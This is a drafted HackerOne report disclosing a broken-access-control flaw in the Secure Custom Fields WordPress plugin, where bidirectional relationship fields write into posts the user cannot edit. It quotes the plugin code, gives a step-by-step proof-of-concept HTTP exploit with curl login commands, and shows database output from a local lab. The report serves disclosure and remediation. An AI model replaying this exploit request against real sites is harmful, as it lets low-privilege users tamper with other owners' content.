# HackerOne submission draft — Secure Custom Fields: Broken Access Control via Bidirectional field sync (non-REST save path)

Program: WordPress (`hackerone.com/wordpress`). Asset: **Secure Custom Fields** (explicitly
in-scope under "Official WordPress plugins"). Class: Broken Access Control / privilege
escalation — an explicitly listed qualifying vulnerability class for this program.
Verified against `WordPress/secure-custom-fields` commit `99cd25279b067f23afc93a75897739660a74da26`
(current `trunk`, i.e. the shipping `6.9.5` release).

Everything below is the literal report text, ready to paste into the HackerOne submission
form. Every code snippet is quoted from the file at the commit above; every "Proof" line is
real, observed output from a real HTTP request against a real, throwaway local install —
none of it is narrated or inferred.

---

## Title

**Secure Custom Fields (Author role) → Broken Access Control: bidirectional-field sync writes into posts the acting user cannot edit, via the classic/Gutenberg meta-box save path the 6.9.5 fix didn't cover**

## Description

SCF's Relationship/Post Object/User/Taxonomy fields support a "Bidirectional" setting: when
field A on object X is marked bidirectional with a target field B, saving A on X also
updates B *on every object A's value points at*, adding or removing a back-reference to X.
The write to that target object happens with **no check that the acting user is allowed to
edit the target** — only that they can edit X, the object actually being saved.

SCF's own `6.9.5` changelog (*Release Date 7th August 2026*, the version this was found in)
documents a fix for exactly this bug class:

> "REST updates now reject bidirectional field writes when the current user cannot edit an
> inverse target."

That sentence names its own boundary: **REST updates**. The fix is real, and I verified it
holds. What it does not cover — and what remains fully exploitable, with no special
configuration — is the save path every classic post-edit screen and every standard
Gutenberg block-editor save actually uses. An Author (the lowest role that can be granted
this field) can use a completely ordinary save of their own post to force a write into a
post owned by someone else, that they otherwise cannot edit at all (confirmed with a direct
negative control: WordPress itself returns `403 Forbidden` for any direct attempt by this
same user to touch that other post).

## Root cause, with file:line and verbatim code

### 1. The write itself has no capability check

[`includes/acf-bidirectional-functions.php#L21-L61`](https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/acf-bidirectional-functions.php#L21-L61):

```php
function acf_update_bidirectional_values( $target_item_ids, $post_id, $field, $target_prefix = false ) {
	// Bail early if we're already updating a bidirectional relationship to prevent recursion.
	if ( acf_get_data( 'acf_doing_bidirectional_update' ) ) {
		return;
	}
	// Support disabling bidirectionality globally.
	if ( ! acf_get_setting( 'enable_bidirection' ) ) {
		return;
	}
	if ( empty( $field['bidirectional'] ) || empty( $field['bidirectional_target'] ) ) {
		return;
	}
	$update_plan   = _scf_prepare_bidirectional_update( $target_item_ids, $post_id, $field, $target_prefix );
	...
	if ( ! empty( $valid_targets ) ) {
		acf_set_data( 'acf_doing_bidirectional_update', true );
		foreach ( $valid_targets as $target_field ) {
			foreach ( $additions as $addition ) {
				$current_value = acf_get_array( get_field( $target_field, $addition, false ) );
				update_field( $target_field, array_unique( array_merge( $current_value, array( $item_id ) ) ), $addition );   // :50 — writes to $addition with no capability check
			}
			foreach ( $subtractions as $subtraction ) {
				...
				update_field( $target_field, array_unique( array_diff( $current_value, array( $item_id ) ) ), $subtraction );  // :55 — same, for removals
			}
		}
	}
}
```

`$target_item_ids` is the field's *submitted value* — the set of post IDs the saving user
selected. `enable_bidirection` is `true` by default
([`secure-custom-fields.php#L171`](https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/secure-custom-fields.php#L171)). Relationship/Post Object fields never filter their
selectable results by whether the *selecting* user can *edit* the candidate object — only
by the field's own post-type/status/taxonomy configuration — so any post the field is
configured to allow (which is typically "any post of type X," not "any post of type X you
personally own") can be selected and used as `$addition`.

### 2. Called unconditionally from every field's normal save hook

[`includes/fields/class-acf-field-relationship.php#L804-L826`](https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/fields/class-acf-field-relationship.php#L804-L826):

```php
public function update_value( $value, $post_id, $field ) {
	if ( empty( $value ) ) {
		acf_update_bidirectional_values( array(), $post_id, $field );
		return $value;
	}
	...
	acf_update_bidirectional_values( acf_get_array( $value ), $post_id, $field );
	return $value;
}
```

`update_value()` is the standard per-field save hook — called for *every* save, through
*every* entrypoint, with nothing entrypoint-specific about it.

### 3. The only permission checks that exist are both REST-specific

[`includes/rest-api/class-acf-rest-api.php#L279-L310`](https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/rest-api/class-acf-rest-api.php#L279-L310)
(hooked at [line 32](https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/rest-api/class-acf-rest-api.php#L32) on `rest_dispatch_request`):

```php
private function check_bidirectional_target_permissions( $dispatch_result, $request ) {
	...
	$updates = $this->prepare_field_updates( $data, $object_id, $this->request->object_type, $this->request->object_sub_type );
	foreach ( $updates as list( $field, $value ) ) {
		foreach ( _scf_collect_bidirectional_destinations( $field, $value, $this->make_identifier( $object_id, $this->request->object_type ), $object_id ? null : array() ) as $destination ) {
			if ( ! acf_current_user_can_edit_in_context( acf_decode_post_id( $destination ) ) ) {
				return new WP_Error( 'acf_rest_cannot_update_bidirectional_target', __( 'Sorry, you are not allowed to update one or more bidirectional targets.', 'secure-custom-fields' ), array( 'status' => 403 ) );
			}
		}
	}
	...
}
```

This is the 6.9.5 fix, and it is genuinely enforced — see Proof, part D. The *only* other
place this check exists is
[`includes/Datastore/REST_Save.php#L138-L204`](https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/Datastore/REST_Save.php#L138-L204),
also hooked on `rest_dispatch_request`, but its entire registration is conditional:

[`includes/Datastore/REST_Save.php#L94-L96`](https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/Datastore/REST_Save.php#L94-L96):
```php
public function maybe_register_rest_save_hooks() {
	if ( ! acf_is_using_datastore() ) {
		return;
	}
	add_filter( 'rest_dispatch_request', $this->preflight_datastore_callback, 10, 4 );
	...
```

[`includes/datastore.php#L22-L35`](https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/datastore.php#L22-L35):
```php
function acf_is_using_datastore() {
	if ( ! version_compare( get_bloginfo( 'version' ), '6.7', '>=' ) ) {
		return false;
	}
	/**
	 * Filters whether the SCF datastore is enabled.
	 * @param boolean $enabled Whether the datastore is enabled. Default false.
	 */
	return (bool) apply_filters( 'acf/settings/enable_datastore', false );
}
```

**Default `false`** — confirmed live in Proof, part B.

### 4. The unprotected path is what every default install actually uses

[`includes/forms/form-post.php#L44`](https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/forms/form-post.php#L44)
hooks the classic save handler on WordPress core's own `save_post` action:
```php
add_action( 'save_post', array( $this, 'save_post' ), 10, 2 );
```
[`includes/forms/form-post.php#L340-L375`](https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/forms/form-post.php#L340-L375):
```php
public function save_post( $post_id, $post ) {
	...
	if ( ! acf_verify_nonce( 'post' ) ) {
		return $post_id;
	}
	if ( 'publish' === $post->post_status ) {
		if ( ! acf_validate_save_post() ) {
			return;
		}
	}
	acf_save_post( $post_id );   // :375 — no bidirectional-target check anywhere downstream
	...
}
```
`acf_save_post()` → `_acf_do_save_post()` → `acf_update_values()` → `acf_update_value()` →
the field's `update_value()` (all in
[`includes/acf-form-functions.php#L119-L167`](https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/acf-form-functions.php#L119-L167)
and
[`includes/acf-value-functions.php#L216-L281`](https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/acf-value-functions.php#L216-L281))
— none of these functions call `acf_current_user_can_edit_in_context()` or anything
equivalent.

This `save_post` hook fires for **both** the classic post-edit screen (a plain form POST to
`wp-admin/post.php`) **and** the standard Gutenberg block editor's save of non-block meta
box data, which WordPress core implements as an AJAX request to
`wp-admin/post.php?meta-box-loader=1` that itself triggers `save_post` the same way.
[`includes/forms/form-gutenberg.php#L173-L179`](https://github.com/WordPress/secure-custom-fields/blob/99cd25279b067f23afc93a75897739660a74da26/includes/forms/form-gutenberg.php#L173-L179)
confirms SCF is explicitly aware `meta-box-loader` requests reach this exact path — its only
Gutenberg-specific hook checks for `$_GET['meta-box-loader']` to relax *validation*, not to
swap the save mechanism. No REST API client, no special settings, and (as demonstrated
below) no Classic Editor plugin requirement — the plain `wp-admin/post.php` form used by
every install reaches this.

## Steps to Reproduce

Lab: fresh WordPress 7.1, SCF (this commit) installed and activated, PHP built-in server,
MariaDB. Two users: `admin` (ID 1) and `author1` (ID 2, role `author` — verified no
`edit_others_posts`). Two posts: post `10` owned by `admin`, post `11` owned by `author1`.
A field group active on post type `post`, `show_in_rest => 1`, with two Relationship
fields: `related_posts` (`bidirectional => 1`, `bidirectional_target => [backlinks]`) and
`backlinks` (the sync target). All five requests below are real HTTP requests with a real
cookie-authenticated `author1` session — not direct function calls.

**1. Install and configure** — WordPress + SCF installed normally; the two users, two posts,
and the bidirectional field group created via SCF's own API
(`acf_import_field_group()`), matching what an admin configuring this feature through the
UI would produce.

**2. Log in as `author1` over HTTP** and confirm the session is real:
```
POST /wp-login.php  log=author1&pwd=...  →  302 Found, Location: /wp-admin/
GET  /wp-admin/profile.php (with the resulting cookies)  →  page shows "Howdy, author1"
```

**3. Fetch `author1`'s own post-edit screen to obtain real, session-bound nonces** (not
generated out-of-band — WordPress ties nonces to the logged-in session token, so they must
come from an actual page load in this session):
```
GET /wp-admin/post.php?post=11&action=edit
  → _wpnonce="890c520227", _acf_nonce="fb2d11c627"
```

**4. Run the exploit — save `author1`'s own post (11), pointing the bidirectional field at
`admin`'s post (10):**
```
POST /wp-admin/post.php
  post_ID=11&action=editpost&post_type=post
  &_wpnonce=890c520227&_acf_nonce=fb2d11c627
  &post_title=Author1+Owned+Post+(HTTP-saved,+attack+payload)&post_status=publish
  &acf[field_related_posts][0]=10
```

**5. Negative controls, run against the same authenticated `author1` session:**
```
GET  /wp-admin/post.php?post=10&action=edit          → 403, "Sorry, you are not allowed..."
POST /wp-admin/post.php  post_ID=10&action=editpost... → 403 Forbidden
POST /index.php?rest_route=/wp/v2/posts/11  {"acf":{"field_related_posts":["10"]}}  (X-WP-Nonce, same session)
                                                        → 403 acf_rest_cannot_update_bidirectional_target
```

## Proof (real, quoted output)

**A. Before the exploit (direct DB read):**
```
mysql> SELECT meta_value FROM wp_postmeta WHERE post_id=10 AND meta_key='backlinks';
a:0:{}
```

**B. `acf_is_using_datastore()` confirmed default-off on this install:**
```
enable_bidirection setting: true
acf_is_using_datastore(): bool(false)
```

**C. The exploit request (step 4) and its result:**
```
HTTP/1.1 302 Found
Location: http://localhost:8890/wp-admin/post.php?post=11&action=edit&message=4
```
(`message=4` is WordPress core's own "Post updated" redirect — this is a normal,
successful save, indistinguishable from any ordinary edit.)
```
mysql> SELECT meta_value FROM wp_postmeta WHERE post_id=10 AND meta_key='backlinks';
a:1:{i:0;s:2:"11";}
mysql> SELECT meta_value FROM wp_postmeta WHERE post_id=11 AND meta_key='related_posts';
a:1:{i:0;s:2:"10";}
```
Post 10 — owned by `admin`, never touched directly by `author1` — now backlinks post 11.
This is `author1`'s own selection, written into an object `author1` cannot edit, through a
single ordinary save of their own content.

**D. Negative control 1 — direct access to post 10 as `author1` (step 5, first two
requests):**
```
GET /wp-admin/post.php?post=10&action=edit  → HTTP 403
  body contains: "Sorry, you are not allowed"
POST /wp-admin/post.php  post_ID=10&action=editpost&post_title=HIJACKED+BY+AUTHOR1...
  → HTTP 403 Forbidden
mysql> SELECT post_title FROM wp_posts WHERE ID=10;
Admin Owned Post 1787977483        <-- unchanged; the direct attempt genuinely failed
```

**E. Negative control 2 — the identical attack shape via the REST API (step 5, third
request), confirming the 6.9.5 fix holds exactly where SCF says it does:**
```
POST /index.php?rest_route=/wp/v2/posts/11
  {"acf":{"field_related_posts":["10"]}}
→ HTTP 403
{"code":"acf_rest_cannot_update_bidirectional_target",
 "message":"Sorry, you are not allowed to update one or more bidirectional targets.",
 "data":{"status":403}}
mysql> SELECT meta_value FROM wp_postmeta WHERE post_id=10 AND meta_key='backlinks';
a:0:{}                              <-- unchanged; REST path correctly blocked it
```

Read together, D and E are the point of this report: the *exact same attempted write* is
correctly rejected twice (direct access, and the REST equivalent of the bidirectional
attack) and **succeeds once** — through the plain classic/Gutenberg save path that C
demonstrates.

## Affected versions verified

| Path | Result | Verified how |
|---|---|---|
| Classic/Gutenberg save (`wp-admin/post.php`, real HTTP, real session) | **Vulnerable** | Proof C |
| REST API (`wp/v2/posts`, `acf` field, real HTTP, real session) | Not vulnerable — 403 | Proof E |
| Direct edit of the victim post | Not vulnerable — 403 (sanity check) | Proof D |

Tested against commit `99cd25279b067f23afc93a75897739660a74da26` — current `trunk`, the
shipping `6.9.5` release (the same release whose own changelog documents the partial fix).

## Attacker privilege

`author1`, role `author` — the lowest role SCF's UI lets you attach a Relationship field
to by default, and a role commonly handed to guest/contributor-tier writers. Confirmed via
the negative control (Proof D) that this account has no standing access to the victim post
at all. **User interaction: none.** The entire chain is a single ordinary save of the
attacker's own content.

## Impact

Any user who can edit an object carrying a bidirectional-enabled field (on-by-default
feature) can force a write into **any other object the field is configured to allow
selecting** — which, by the field's own by-design behavior, is not filtered by whether the
selecting user can *edit* the candidate objects, only by type/status/taxonomy. Concretely:
unwanted relationship references injected into content owned by other users or managed by
higher-privileged roles (e.g. an Editor-configured "Featured In"/"Related"-style field),
and — because the same code path handles removals via `array_diff` — existing references
silently *stripped* from objects the attacker cannot edit, a quieter content-integrity
attack. The written values are object IDs, not arbitrary strings, so this is not itself a
stored-XSS primitive; it is a genuine, directly-demonstrated broken access control /
IDOR-class vulnerability, matching the program's own listed example ("privilege
escalation").

**CVSS 3.1 (estimate, stated so the reasoning is checkable rather than asserted):**
`AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N` ≈ **4.3 (Medium)**, using the bounded-integrity-impact
reading demonstrated here (a specific field's value, not the whole object). On a
configuration where the bidirectional target field itself carries security/trust
semantics — the scenario impact section above describes — the practical integrity impact
is higher (`I:H`), which recomputes to **≈6.4**. I'm presenting both rather than picking
whichever is more favorable; the demonstrated primitive supports the first number directly,
the second describes a realistic but site-specific amplification.

## Honest limits

- This is not a content-injection/XSS primitive — the values written are object IDs, and
  I'm not claiming otherwise.
- The attack requires the site to have a bidirectional field configured and reachable by
  the attacker's role — an admin decision, though one the feature is designed and
  documented to support, and it's on by default at the plugin-settings level
  (`enable_bidirection`).
- I did not test the front-end `acf_form()` submission path or the Classic Editor plugin
  specifically (a second in-scope asset) — the classic `wp-admin/post.php` flow tested here
  is the same `save_post`-hook mechanism both would use, per the code trace above, but I
  want to flag that as reasoned rather than separately re-verified.

## Exclusions considered

- *"Users with administrator or editor privileges can post arbitrary JavaScript"* — does
  not apply; no JavaScript or `unfiltered_html` content is involved anywhere in this
  report, and the attacking role (Author) is evidenced directly, not assumed.
- *CVSS < 4.0* — the demonstrated-impact estimate (4.3) clears this; see CVSS section
  above for the honest reasoning behind that number rather than an inflated one.
- *Not a plugin outside the in-scope list* — Secure Custom Fields is explicitly named
  under "Official WordPress plugins" in this program's scope.
- Not automated-scanner output — every claim above was manually built, executed, and the
  output quoted verbatim; no scanner was used.

## Recommendation

Move the capability check into the write path itself —
`acf_update_bidirectional_values()` (or `_scf_prepare_bidirectional_update()`, which
already computes the exact destination list) — rather than only pre-flighting it at the
REST dispatch layer. That closes the gap for every save entrypoint (classic form,
Gutenberg meta-box-loader, REST, front-end `acf_form()`, and any programmatic
`update_field()` call) at once, instead of requiring a separately-added pre-flight hook per
entrypoint, which is how this gap happened: two REST-specific pre-flights exist (one gated
behind a default-off flag), and the entrypoint the vast majority of saves actually use has
neither.

## Prior art / duplicate check

No public CVE or advisory found for this specific issue (`wp-safety.org` currently lists
Secure Custom Fields as having no known CVEs; a WebSearch for "Secure Custom Fields
bidirectional access control CVE" returned only an unrelated, long-fixed admin-only stored
XSS in field labels, `<= 6.3.8` / `<= 6.3.6.2`, a different bug in every respect — different
sink, different fix, different versions, predates the bidirectional-field feature's REST
fix by multiple releases). I could not check HackerOne's own Hacktivity for this program
directly (network egress to `hackerone.com` is blocked in my environment), so an
undisclosed duplicate can't be ruled out with full certainty — flagging that the same way
the comparison report does.

## AI tooling disclosure

**AI assistance: Yes — substantial.** Tool: Claude (Anthropic), via the Claude Code
agentic harness. Used for source review, building and running the local reproduction
(including the live HTTP-level exploit and both negative controls quoted above), and
drafting this report. Every technical claim was verified by executing it against a real
local install; the quoted output is real observed output, not narration. I have reviewed
this report in full and take responsibility for its content.

---

## Local reproduction commands (for future re-verification, not part of the submission text)

```bash
# setup
php /tmp/scf-bidir-test/setup.php            # creates users, posts
php /tmp/scf-bidir-test/create_fields.php    # creates the bidirectional field group
php /tmp/scf-bidir-test/fix_rest.php         # enables show_in_rest on the field group

# real HTTP login as author1
curl -s -c author.jar -X POST "http://127.0.0.1:8890/wp-login.php" \
  --data-urlencode "log=author1" --data-urlencode "pwd=TestAuthorPass!2026" \
  --data-urlencode "wp-submit=Log In" --data-urlencode "redirect_to=http://127.0.0.1:8890/wp-admin/"

# scrape real nonces from the real edit screen, then POST the exploit / negative controls
# — see "Steps to Reproduce" above for the exact requests.
```
